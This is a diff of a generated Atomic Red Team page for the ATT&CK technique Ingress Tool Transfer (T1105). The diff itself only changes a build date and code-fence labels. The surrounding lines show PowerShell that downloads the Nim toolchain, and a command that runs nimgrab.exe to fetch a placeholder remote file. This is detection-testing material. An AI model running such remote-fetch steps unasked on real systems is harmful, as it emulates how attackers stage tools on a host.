@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1105"
 attack_technique_name: "Ingress Tool Transfer"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml"
-build_date: "2026-04-26 14:38:39"
+build_date: "2026-04-26 17:02:12"
 executor: "command_prompt"
 aliases:
   - "b1729c57-9384-4d1c-9b99-9b220afb384e"
@@ -57,13 +57,13 @@ NimGrab must be installed on system.
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\nimgrab.exe") {exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
 Invoke-WebRequest "https://nim-lang.org/download/nim-1.6.6_x64.zip" -Outfile "PathToAtomicsFolder\..\ExternalPayloads\nim.zip"
 Expand-Archive -Path "PathToAtomicsFolder\..\ExternalPayloads\nim.zip" -DestinationPath "PathToAtomicsFolder\..\ExternalPayloads\nim" -Force
@@ -76,13 +76,13 @@ Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\nim\nim-1.6.6\bin\nimgrab.exe
 
 ### Command
 
-```commandprompt
+```cmd
 cmd /c "PathToAtomicsFolder\..\ExternalPayloads\nimgrab.exe" #{remote_file} #{destination_path}
 ```
 
 ### Cleanup
 
-```commandprompt
+```cmd
 del #{destination_path} >nul 2>&1
 ```
 
